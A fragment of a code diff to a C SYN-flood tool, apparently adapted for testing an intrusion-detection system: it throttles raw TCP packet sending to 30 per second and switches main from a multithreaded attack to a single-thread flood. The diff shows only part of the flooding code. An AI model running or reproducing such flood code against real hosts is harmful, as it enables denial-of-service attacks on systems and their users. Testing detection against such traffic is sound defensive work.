@@ -201,16 +201,27 @@ void syn_flooding () {
             perror("failed to send...");
             pthread_exit("fail");
         } else {
-            printf("Sent out!! Thread %d -> Packet %d ...", getuid(), ++packet_count);
             printf("srdIP:%s:%d\t", srcIP, ntohs(tcp_h->source));
             printf("dstIP:%s:%d\n", dstIP, ntohs(tcp_h->dest));
+            packet_count++;
         }
         printf("tcphdr sport -> %d\n", ntohs(tcp_h->source));
+
+        // use to test detection code, 30 packets per sec.
+        // printf("Count : %d\n", packet_count);
+        if (packet_count % 30 == 0) {
+            packet_count = 0;
+            sleep(1);
+        } 
     }
     close(s);
 }
 
-void attack() {
+/*
+    @usage : attack with threads (max = 128)
+ */
+
+void attack_multithread() {
     int err;
     pthread_t pthread[MAXCHILD];
     for (int i = 0; i < MAXCHILD; i++) {
@@ -229,6 +240,7 @@ void attack() {
     }
 }
 
+
 int main (int argc, char* argv[]) {
     // signal(SIGINT, sig_int);
     srcIP = (char*) malloc(sizeof(20));
@@ -236,6 +248,8 @@ int main (int argc, char* argv[]) {
     dstPort = atoi(argv[2]);
     srand(time(NULL));
     fastrand(time(NULL));
-    attack();
+
+    // attack_multithread();
+    syn_flooding();
     return 0;
 }
